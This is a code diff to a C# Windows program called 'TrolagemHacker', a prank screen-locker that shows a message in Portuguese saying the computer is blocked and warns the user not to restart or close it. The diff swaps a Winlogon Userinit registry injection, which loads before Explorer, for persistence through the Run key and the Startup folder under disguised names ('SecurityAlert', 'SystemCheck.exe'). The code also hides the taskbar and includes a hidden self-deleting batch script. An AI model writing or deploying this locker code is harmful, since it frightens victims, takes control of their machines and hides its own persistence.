@@ -93,7 +93,7 @@ public class TrolagemHacker : Form
         Label lblTexto = new Label();
         lblTexto.Text = "Ola, irmao. Seu computador foi bloqueado!\n\n" +
                         "AVISO: NAO TENTE REINICIAR OU FECHAR ESTA JANELA.\n" +
-                        "SHELL MASTER ATIVADO - BLOQUEIO PRE-DESKTOP.";
+                        "SISTEMA SILENCIOSO ATIVADO.";
         lblTexto.ForeColor = Color.Lime;
         lblTexto.Font = new Font("Courier New", 12, FontStyle.Bold);
         lblTexto.TextAlign = ContentAlignment.MiddleCenter;
@@ -141,22 +141,13 @@ public class TrolagemHacker : Form
             } catch {}
         }
 
-        // --- TÉCNICA SHELL MASTER (INJEÇÃO USERINIT) ---
         try {
             string exePath = Application.ExecutablePath;
-            // 1. Injeção no Userinit (Requer Admin para funcionar 100%)
-            // O Userinit é o que carrega o Shell (Explorer). Ao nos colocarmos lá, o Windows nos abre ANTES do Explorer.
-            RegistryKey rkShell = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
-            if (rkShell != null) {
-                string currentVal = rkShell.GetValue("Userinit").ToString();
-                if (!currentVal.Contains(exePath)) {
-                    rkShell.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe," + exePath + ",");
-                }
-            }
+            RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            rk.SetValue("SecurityAlert", exePath);
             
-            // 2. Desativar Startup Delay (Reforço)
-            RegistryKey rkDelay = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize");
-            rkDelay.SetValue("StartupDelayInMSec", 0, RegistryValueKind.DWord);
+            string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
+            if (!File.Exists(startupPath)) File.Copy(exePath, startupPath, true);
         } catch {}
 
         ControlarBarraTarefas(false);
@@ -193,18 +184,12 @@ public class TrolagemHacker : Form
             ControlarBarraTarefas(true);
             
             try {
-                // Restaurar Userinit Original
-                RegistryKey rkShell = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
-                if (rkShell != null) {
-                    rkShell.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe,");
-                }
-                
-                Registry.CurrentUser.DeleteSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize", false);
+                Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("SecurityAlert", false);
+                string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
+                if (File.Exists(startupPath)) File.Delete(startupPath);
 
-                // Autodestruicao
-                string exePath = Application.ExecutablePath;
                 string batPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
-                File.WriteAllText(batPath, "@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"" + exePath + "\"\ndel /f /q \"%~f0\"\nexit");
+                File.WriteAllText(batPath, "@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"" + Application.ExecutablePath + "\"\ndel /f /q \"%~f0\"\nexit");
                 Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + batPath + "\"") { WindowStyle = ProcessWindowStyle.Hidden });
             } catch {}
 
